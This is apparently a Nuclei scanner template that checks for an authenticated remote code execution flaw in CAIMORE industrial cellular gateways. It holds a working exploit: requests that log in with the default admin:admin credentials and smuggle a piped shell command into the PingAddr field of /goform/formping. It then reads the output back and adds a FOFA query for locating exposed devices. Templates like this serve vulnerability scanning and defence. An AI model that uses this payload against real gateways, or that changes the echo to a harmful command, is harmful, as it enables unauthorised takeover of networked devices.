http:
- attack: pitchfork
  matchers:
  - part: body_2
    type: word
    words:
    - '{{randstr}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - admin
    username:
    - admin
  raw:
  - 'POST /goform/formping HTTP/1.1

    Host: {{Hostname}}

    Authorization: Basic {{base64(username + '':'' + password)}}

    Accept-Encoding: gzip


    PingAddr=127.0.0.1%7Cecho%20{{randstr}}&PingPackNumb=1&PingMsg=

    '
  - 'GET /pingmessages HTTP/1.1

    Host: {{Hostname}}

    Authorization: Basic {{base64(username + '':'' + password)}}

    Accept-Encoding: gzip

    '
id: caimore-gateway-rce
info:
  author: momika233
  description: 'The gateway of Xiamen Caimao Communication Technology Co., Ltd. is
    designed with open software architecture. It is a metal shell design, with two
    Ethernet RJ45 interfaces, and an industrial design wireless gateway using 3G/4G/5G
    wide area network for Internet communication. There is a command execution vulnerability
    in the formping file of the gateway of Xiamen Caimao Communication Technology
    Co., Ltd. An attacker can use this vulnerability to arbitrarily execute code on
    the server side, write to the back door, obtain server permissions, and then control
    the entire web server.

    '
  metadata:
    fofa-query: app="CAIMORE-Gateway"
    max-request: 2
  name: CAIMORE Gateway - Remote Code Execution
  reference:
  - https://www.ctfiot.com/126482.html
  severity: high
  tags: ciamore-gateway,rce,authenticated,intrusive
